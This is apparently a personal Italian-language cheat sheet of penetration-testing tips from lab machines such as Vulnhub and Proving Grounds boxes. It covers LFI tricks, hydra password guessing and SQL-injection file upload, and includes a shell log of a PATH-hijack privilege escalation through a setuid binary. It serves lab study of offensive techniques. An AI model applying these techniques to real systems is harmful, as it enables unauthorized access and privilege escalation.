
- Se non funziona con http, potrebbe esserci qualcosa in https

- Se vedi mysql con accesso di root, puoi provare adeseguire codice oppurelavuln nota di /usr/lib/lib_mysqludf_sys.so

- Se vedi eseguibili che chiamano altri eseguibili tipo cat, puoi provare a cambiare lavariabile di ambiente PATH per far eseguire il tuo comando cat


kane@pwnlab:~$ echo "/bin/bash" > cat
echo "/bin/bash" > cat
kane@pwnlab:~$ ls -la
ls -la
total 32
drwxr-x--- 2 kane kane 4096 Jun  1 08:16 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc
-rw-rw-rw- 1 kane kane   10 Jun  1 08:16 cat
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile
kane@pwnlab:~$ chmod 777 cat
chmod 777 cat
kane@pwnlab:~$ export PATH=/home/kane:$PATH
export PATH=/home/kane:$PATH
kane@pwnlab:~$ ./msgmike
./msgmike
mike@pwnlab:~$ id
id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)



- Se ho una password e una lista di utenti posso provare ad eseguire hydra e vedere se qualche utente in ssh ha quella password :D
- Oppure se ho una lista di utenti posso provare ad eseguire hydra con user e password con la lista di utenti (magari si trova che qualche utente ha come password l'utente)

- Se hai la porta aperta di smb, esegui enum4linux

- Se hai ftp, prova a fare upload

- Se hai parametri nell'url, pova LFI


- Privilege Escalation Linux -> checklist https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist


- Metti che un brute force ci mette tanto (per esempio un login di wordpress) prova ad invertire la wordlist (se questa wordlist è stata trovata da una directory della web app della macchina per esempio) [tipo Mr Robot di Vulnhub]

- Se vedi i processi (magari tramite snmp) cerca se ci sono vulnerabilità note

- bash -i se non c'è python e hai bisogno di avere una shell un po' più "shell"

- Se ci sono script che potrebbero funzionare, prova varie porte per il listening per fare RCE


- Cerca di pensare semplice 
- Se hai gli utenti da /etc/passwd puoi provare a usare l'username come password

- Se dopo un'ora non trovi un modo per fare privilege escalation, forse è più semplice di quello che sembra

- Se LFI non funziona con un path (magari nemmeno con le tecniche per bypassare tipo %00), magari ce n'è un altro che non hai visto
- LFI:

- Se è con include $install_dir in cui install_dir viene preso come parametro dall'url, potrebbe non funzionare:

www-data@payday:/tmp$ cat /var/www/core/install.php 
cat /var/www/core/install.php 
<?php

//
// $Id: install.php 1468 2006-03-20 09:43:47Z
//

include $install_dir.'/prepare.php';


- Se invece c'è require_once, è possibile che funzioni con %00

$ cat class.cs_phpmailer.php
<?php

global $classes_dir;
require_once($classes_dir . 'phpmailer' .DS. 'class.phpmailer.php');


- In windows vedi in "Program Files" e "Program Files (x86)" se ci sono programmi strani tipo "PaperStream IP" (come nella macchina Jacko di Proving Grounds)

- Powershell sta dentro:
C:\Windows\System32\WindowsPowerShell>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC2F-6399

 Directory of C:\Windows\System32\WindowsPowerShell

03/18/2019  09:52 PM    <DIR>          .
03/18/2019  09:52 PM    <DIR>          ..
03/18/2019  11:20 PM    <DIR>          v1.0
               0 File(s)              0 bytes
               3 Dir(s)   6,892,978,176 bytes free


- CONROLLA TUTTE LE PORTE DI NMAP!!!!!!!!!

- Se hai una SQLi puoi provare a caricargli uno script php (vedi sezione SQLi del file machine oppure appunti della macchina Medjed di Proving Grounds)

- Se hai le credenziali SSH, puoi uploadare i dile con scp

- Prova sia get sia post